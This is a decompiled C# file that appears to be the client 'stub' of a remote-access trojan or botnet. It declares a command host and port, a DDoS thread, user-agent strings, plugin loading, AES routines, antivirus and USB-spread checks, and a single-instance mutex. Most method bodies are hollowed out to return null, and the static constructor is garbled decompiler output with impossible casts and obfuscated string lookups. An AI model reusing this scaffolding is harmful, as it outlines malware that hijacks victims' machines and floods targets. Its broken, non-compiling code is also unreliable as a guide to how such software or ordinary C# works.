using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

[StandardModule]
internal sealed class Helper
{
	private static readonly string[] userAgents;

	public static string IPHOST;

	public static string PortHost;

	public static Thread DDos;

	static Helper()
	{
		//IL_000e: Expected O, but got I4
		//IL_002b: Expected O, but got I4
		//IL_004b: Expected O, but got I4
		//IL_0074: Expected O, but got I4
		Class0.smethod_13();
		string[] array = (string[])6;
		array = new string[3];
		smethod_2();
		if (smethod_1())
		{
			array = (string[])0;
			if (!smethod_1())
			{
			}
			array[0] = Class0.smethod_11(2064);
		}
		else
		{
			array = (string[])3;
		}
		array[1] = Class0.smethod_11(2068);
		array[2] = Class0.smethod_11(2072);
		userAgents = array;
		array = (string[])7;
	}

	public static byte[] SB(string string_0)
	{
		return null;
	}

	public static string BS(byte[] byte_0)
	{
		return null;
	}

	public static string ID()
	{
		return null;
	}

	public static string GetHashT(string string_0)
	{
		return null;
	}

	public static object smethod_0(string string_0)
	{
		return null;
	}

	public static object objj(string string_0)
	{
		return null;
	}

	public static object Plugin(byte[] byte_0, string string_0)
	{
		return null;
	}

	public static byte[] AES_Encryptor(byte[] byte_0)
	{
		return null;
	}

	public static byte[] AES_Decryptor(byte[] byte_0)
	{
		return null;
	}

	public static string INDATE()
	{
		return null;
	}

	public static string usbp()
	{
		return null;
	}

	public static string admin()
	{
		return null;
	}

	public static string Comment()
	{
		return null;
	}

	public static string Antivirus()
	{
		return null;
	}

	public static bool CreateMutex()
	{
		return true;
	}

	public static void CloseMutex()
	{
	}

	public static object STDos()
	{
		return null;
	}

	public static string IsValid(string string_0)
	{
		return null;
	}

	internal static bool smethod_1()
	{
		return true;
	}

	internal static bool smethod_2()
	{
		return true;
	}
}
